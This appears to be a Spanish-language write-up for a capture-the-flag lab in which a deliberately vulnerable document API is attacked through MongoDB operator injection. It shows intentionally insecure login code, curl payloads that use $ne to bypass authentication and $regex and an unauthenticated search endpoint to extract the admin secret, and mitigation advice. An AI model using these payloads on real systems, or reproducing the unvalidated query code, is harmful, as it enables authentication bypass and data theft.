# DocStore — hardcore-api-nosql

| Campo       | Valor                          |
|-------------|-------------------------------|
| ID          | api-hardcore-nosql            |
| Nombre      | DocStore                      |
| Categoria   | api                           |
| Dificultad  | hardcore                      |
| Puerto      | 80 (host: 8083 por defecto)   |
| Timeout     | 3600 s                        |

---

## Descripcion

Una API de almacenamiento de documentos usa un motor NoSQL (MongoDB-like) para
persistencia. El endpoint `/api/login` pasa el cuerpo JSON directamente como
consulta a la base de datos, sin sanitizacion. El endpoint `/api/search` permite
busquedas arbitrarias sin autenticacion.

El usuario administrador tiene un campo `secret` que contiene la FLAG. Para
acceder a el se puede:
- Bypassear el login usando operadores MongoDB (`$ne`, `$regex`).
- Usar `/api/search` directamente sin autenticacion.

---

## Vulnerabilidad

**NoSQL Injection — MongoDB Operator Injection**

MongoDB soporta operadores especiales en las consultas como `$ne` (not equal),
`$gt`, `$regex`, etc. Si la aplicacion pasa el JSON del cliente directamente
a la funcion de busqueda sin validar que los valores son del tipo esperado
(string), un atacante puede incluir objetos con operadores.

### Codigo vulnerable

```python
@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json(silent=True)
    # VULNERABLE: no se valida que username/password sean strings
    query = {'username': data['username'], 'password': data['password']}
    user = find_one(USERS_COLLECTION, query)
```

Si `data['username'] = {"$ne": ""}`, la consulta resultante es:
```
{username: {$ne: ""}, password: {$ne: ""}}
```
Esto coincide con cualquier documento cuyo username no sea cadena vacia
y cuya password tampoco lo sea — es decir, todos los usuarios. El primer
documento en la coleccion es `admin`.

---

## Pasos del ataque

### Metodo 1 — Inyeccion en /api/login

#### Paso 1 — Confirmar que login normal falla

```bash
curl -s -X POST http://localhost:8083/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrongpassword"}'

# {"error": "Invalid credentials"}
```

#### Paso 2 — Inyectar operador $ne para bypass de autenticacion

```bash
curl -s -X POST http://localhost:8083/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# Respuesta:
{
  "token": "abc123...",
  "username": "admin",
  "role": "admin"
}
```

La consulta `{username: {$ne: ""}, password: {$ne: ""}}` coincide con
el primer documento — el usuario admin.

#### Paso 3 — Obtener el perfil completo con el token obtenido

```bash
curl -s http://localhost:8083/api/profile \
  -H "Authorization: Bearer abc123..."

# Respuesta:
{
  "_id": "1",
  "username": "admin",
  "role": "admin",
  "secret": "CTF{...FLAG...}"
}
```

### Metodo 2 — Busqueda sin autenticacion en /api/search

El endpoint `/api/search` no requiere autenticacion y acepta consultas arbitrarias:

```bash
# Buscar todos los usuarios con rol admin
curl -s -X POST http://localhost:8083/api/search \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Respuesta:
{
  "results": [
    {
      "_id": "1",
      "username": "admin",
      "role": "admin",
      "secret": "CTF{...FLAG...}"
    }
  ],
  "count": 1
}
```

### Metodo 3 — Operador $regex para busqueda por patron

```bash
# Encontrar documentos cuyo campo secret empieza con CTF{
curl -s -X POST http://localhost:8083/api/search \
  -H "Content-Type: application/json" \
  -d '{"secret": {"$regex": "^CTF\\{"}}'
```

---

## Script de solucion automatizado

```bash
python solve.py localhost 8083
```

El script demuestra los tres vectores de ataque.

---

## Como ejecutar el reto

```bash
FLAG="CTF{test_flag_123}" docker-compose up --build
# Acceder en http://localhost:8083
```

---

## Mitigacion (para referencia educativa)

- Validar y castear explicitamente los valores de entrada a tipos esperados:
  ```python
  username = str(data.get('username', ''))
  password = str(data.get('password', ''))
  ```
- Nunca pasar input del usuario directamente como objeto de consulta NoSQL.
- Implementar autenticacion en endpoints de busqueda que exponen datos sensibles.
- Sanitizar los campos devueltos al cliente (no exponer `secret` en busquedas publicas).
